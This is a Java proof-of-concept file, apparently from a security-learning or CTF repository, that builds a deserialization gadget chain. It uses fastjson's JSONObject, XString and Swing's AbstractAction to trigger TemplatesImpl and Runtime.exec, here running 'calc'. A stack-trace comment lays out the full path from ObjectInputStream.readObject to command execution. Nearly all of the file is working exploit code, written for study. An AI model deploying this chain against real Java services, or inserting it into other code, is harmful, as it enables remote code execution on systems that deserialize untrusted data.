package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.javasec.utils.SerializeUtils;
import com.sun.org.apache.xpath.internal.objects.XString;

import javax.swing.*;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import java.lang.reflect.Field;

/**
 exec:347, Runtime (java.lang)
 <init>:-1, a
 newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 newInstance:422, Constructor (java.lang.reflect)
 newInstance:442, Class (java.lang)
 getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
 write:-1, ASMSerializer_1_TemplatesImpl (com.alibaba.fastjson.serializer)
 write:251, MapSerializer (com.alibaba.fastjson.serializer)
 write:275, JSONSerializer (com.alibaba.fastjson.serializer)
 toJSONString:799, JSON (com.alibaba.fastjson)
 toString:793, JSON (com.alibaba.fastjson)
 equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 firePropertyChange:273, AbstractAction (javax.swing)
 putValue:211, AbstractAction (javax.swing)
 readObject:364, AbstractAction (javax.swing)
 invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 invoke:62, NativeMethodAccessorImpl (sun.reflect)
 invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 invoke:497, Method (java.lang.reflect)
 invokeReadObject:1058, ObjectStreamClass (java.io)
 readSerialData:1900, ObjectInputStream (java.io)
 readOrdinaryObject:1801, ObjectInputStream (java.io)
 readObject0:1351, ObjectInputStream (java.io)
 readObject:371, ObjectInputStream (java.io)
 base64deserial:66, SerializeUtils (com.javasec.utils)
 main:78, AbstractTemplatesChain (com.javasec.pocs.fastjson)
 * 指定-javaagent:E:\CTFLearning\Java\JavaSec\AbstractActionAgent.jar
 */
public class AbstractTemplatesChain {
    public static void main(String[] args) throws Exception {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("pop",SerializeUtils.getTemplate("calc"));
        XString xstr = new XString("");
        StyledEditorKit.AlignmentAction action = SerializeUtils.createWithoutConstructor(StyledEditorKit.AlignmentAction.class);
        SerializeUtils.setFieldValue(action, "changeSupport", new SwingPropertyChangeSupport(""));
        action.putValue("p1", "");
        action.putValue("p2", "");
        Field tablefield = AbstractAction.class.getDeclaredField("arrayTable");
        tablefield.setAccessible(true);
        Object atable = tablefield.get(action);
        Field tablefield1 = atable.getClass().getDeclaredField("table");
        tablefield1.setAccessible(true);
        Object[] table1 = (Object[])tablefield1.get(atable);
        table1[1] = xstr;
        table1[3] = jsonObject;
        tablefield1.set(atable, table1);
        SerializeUtils.base64deserial(SerializeUtils.base64serial(action));
    }
}
